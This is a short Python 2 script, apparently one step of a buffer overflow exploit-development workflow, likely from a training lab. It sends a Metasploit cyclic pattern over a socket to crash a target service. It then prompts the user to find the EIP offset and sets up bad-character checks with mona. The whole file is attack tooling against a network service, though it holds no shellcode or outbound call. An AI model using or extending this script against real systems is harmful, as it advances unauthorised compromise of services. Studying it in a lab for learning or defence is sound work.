import socket
import sys
from constants import *
import pyperclip

cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %s > pattern" % BUFFER_TOTLEN
pyperclip.copy(cmd)
print "\n\n\nPlz run (copied to clipboard): %s" % cmd
raw_input()

with open('pattern') as f:
    buf = f.read().strip()

print "Sending pattern.."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
send_payload(s, buf)


cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l %s -q " % BUFFER_TOTLEN
pyperclip.copy(cmd)
print "Plz run (copied to clipboard): %sEIP_ADDRESS" % cmd
print "And paste the result into constants.py as BUFFER_OFFSET"
print "Press enter to continue..."
raw_input()


print "\nPrepare for next step: bad characters"
cmd = "!mona bytearray -b '\\x00\\x0d\\x0a'"
pyperclip.copy(cmd)
print "reset with (copied to clipboard): %s" % cmd

